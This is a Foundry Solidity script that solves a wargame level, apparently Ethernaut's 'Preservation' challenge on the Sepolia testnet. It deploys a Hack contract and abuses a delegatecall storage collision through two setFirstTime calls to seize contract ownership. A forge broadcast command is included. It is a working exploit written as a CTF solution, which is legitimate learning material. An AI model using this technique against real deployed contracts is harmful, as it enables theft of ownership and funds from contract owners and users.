// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Preservation, Hack} from "../src/level16.sol";

contract Level16Script is Script {
    function run(address instanceAddress, address hacker) external {
        Preservation target = Preservation(instanceAddress);
        address ownerBefore = target.owner();
        console.log("Owner before: ", ownerBefore);
        console.log("Hacker address: ", hacker);

        vm.startBroadcast();
        Hack hackContract = new Hack();
        target.setFirstTime(uint256(uint160(address(hackContract))));
        target.setFirstTime(uint256(uint160(hacker)));
        vm.stopBroadcast();

        address ownerAfter = target.owner();
        console.log("Owner after: ", ownerAfter);
        console.log("Attack successful: ", ownerAfter == hacker);
    }
}
//forge script script/level16.s.sol:Level16Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account mytestkey --sig "run(address,address)" your instance address your wallet address
